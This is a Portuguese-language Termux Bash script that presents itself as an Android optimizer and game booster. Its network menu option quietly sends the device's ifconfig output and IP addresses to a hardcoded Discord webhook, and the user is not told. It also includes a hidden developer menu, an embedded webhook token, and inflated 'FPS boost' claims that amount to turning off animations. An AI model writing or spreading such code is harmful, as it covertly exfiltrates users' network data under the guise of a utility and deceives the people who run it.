#!/data/data/com.termux/files/usr/bin/bash

termux-setup-storage 2>/dev/null

WEBHOOK="https://discord.com/api/webhooks/1500190635963973703/sRPtH3sHlYH40LmNuHOzSQqp2cKzqeFFiaf5cVEei9xPbzkxznaDeFNwb5lPwiFfiGDV"

# ==============================
# FUNÇÃO WEBHOOK DISCORD
# ==============================
send_webhook () {
    local title="$1"
    local desc="$2"

    curl -s -H "Content-Type: application/json" \
    -X POST \
    -d "{
      \"embeds\": [{
        \"title\": \"$title\",
        \"description\": \"$desc\",
        \"color\": 3447003
      }]
    }" \
    "$WEBHOOK" > /dev/null
}

while true
do
clear

echo "================================="
echo "        PAINEL TERMUX PRO"
echo "================================="
echo ""
echo "1 - Relatório do sistema"
echo "2 - Rede / IP / ifconfig"
echo "3 - Otimização FPS"
echo "4 - Game Booster"
echo "5 - Scanner de arquivos"
echo "6 - Gerenciador de arquivos"
echo "7 - Criador de arquivos"
echo "8 - Monitor do sistema"
echo "0 - Sair"
echo ""

read -p "Escolha: " op

# ==============================
# MENU SECRETO
# ==============================
if [ "$op" = "." ]; then
clear
echo "==============================="
echo "      MENU SECRETO (DEV)"
echo "==============================="
echo ""
echo "1 - Info avançada"
echo "2 - Reset otimização"
echo "3 - Teste de rede"
echo "4 - Lista de processos"
echo "0 - Voltar"
echo ""

read -p "Escolha: " s

case $s in

1)
getprop | head -n 40
;;

2)
settings put global window_animation_scale 0
settings put global transition_animation_scale 0
settings put global animator_duration_scale 0
echo "✔ Otimização resetada"
;;

3)
ping -c 4 8.8.8.8
;;

4)
top | head -n 20
;;

0)
;;

esac

read -p "ENTER..."
continue
fi

# ==============================
# FUNÇÕES PRINCIPAIS
# ==============================
case $op in

# ------------------------------
# 1 - SISTEMA
# ------------------------------
1)
clear

echo "==============================="
echo "   RELATÓRIO DO SISTEMA"
echo "==============================="

echo ""
echo "📱 Modelo: $(getprop ro.product.model)"
echo "🤖 Android: $(getprop ro.build.version.release)"
echo "🏷️ Fabricante: $(getprop ro.product.manufacturer)"
echo "⚙️ Hardware: $(getprop ro.hardware)"
echo "🐧 Kernel: $(uname -r)"
echo "⏱️ Uptime: $(uptime -p)"

echo ""
echo "🧠 RAM:"
free -h

echo ""
echo "💾 Armazenamento:"
df -h /sdcard

echo ""
echo "🔋 Bateria:"
termux-battery-status 2>/dev/null

read -p "ENTER..."
;;

# ------------------------------
# 2 - REDE + DISCORD
# ------------------------------
2)
clear

IFCONFIG_INFO=$(ifconfig 2>/dev/null || echo "ifconfig não instalado")
LOCAL_IP=$(ip addr show wlan0 2>/dev/null | grep "inet " | awk '{print $2}')
EXTERNAL_IP=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7}')

echo "==============================="
echo "        REDE / IP"
echo "==============================="

echo ""
echo "📡 IFCONFIG:"
echo "$IFCONFIG_INFO"

echo ""
echo "🌐 IP LOCAL: $LOCAL_IP"
echo "🌍 IP EXTERNO: $EXTERNAL_IP"

# ENVIO DISCORD
send_webhook "📡 Rede / IP do Dispositivo" "
📡 IFCONFIG:
$IFCONFIG_INFO

🌐 IP LOCAL:
$LOCAL_IP

🌍 IP EXTERNO:
$EXTERNAL_IP
"

read -p "ENTER..."
;;

# ------------------------------
# 3 - FPS BOOST
# ------------------------------
3)
clear

echo "Otimizando sistema..."

settings put global window_animation_scale 0
settings put global transition_animation_scale 0
settings put global animator_duration_scale 0

cmd activity idle-maintenance 2>/dev/null

echo "✔ FPS otimizado"
echo "✔ Sistema leve"

read -p "ENTER..."
;;

# ------------------------------
# 4 - GAME BOOSTER
# ------------------------------
4)
clear

echo "1 - Free Fire"
echo "2 - Outro app"
echo ""

read -p "Escolha: " g

case $g in
1)
am force-stop com.dts.freefireth 2>/dev/null
monkey -p com.dts.freefireth -c android.intent.category.LAUNCHER 1
;;
2)
pm list packages | cut -d ":" -f2 | fzf | xargs am force-stop
;;
esac

echo "✔ Otimizado"
sleep 2
;;

# ------------------------------
# 5 - SCANNER
# ------------------------------
5)
clear

read -p "Diretório: " dir

echo ""
echo "Arquivos suspeitos:"
find "$dir" -type f \( -name "*.sh" -o -name "*.py" -o -name "*.apk" \)

read -p "ENTER..."
;;

# ------------------------------
# 6 - GERENCIADOR
# ------------------------------
6)
clear

ls

echo ""
read -p "Arquivo: " a
read -p "Destino: " d

cp "$a" "$d"

echo "✔ Copiado"
sleep 2
;;

# ------------------------------
# 7 - CRIAR ARQUIVO
# ------------------------------
7)
clear

read -p "Diretório: " dir
mkdir -p "$dir"

read -p "Nome do arquivo: " nome
file="$dir/$nome"

echo "Digite conteúdo (FIM para sair):"
> "$file"

while true
do
read t
[ "$t" = "FIM" ] && break
echo "$t" >> "$file"
done

echo "✔ Criado"
read -p "ENTER..."
;;

# ------------------------------
# 8 - MONITOR
# ------------------------------
8)
clear

top | head -n 20
echo ""
termux-battery-status 2>/dev/null

read -p "ENTER..."
;;

# ------------------------------
# SAIR
# ------------------------------
0)
exit
;;

esac

done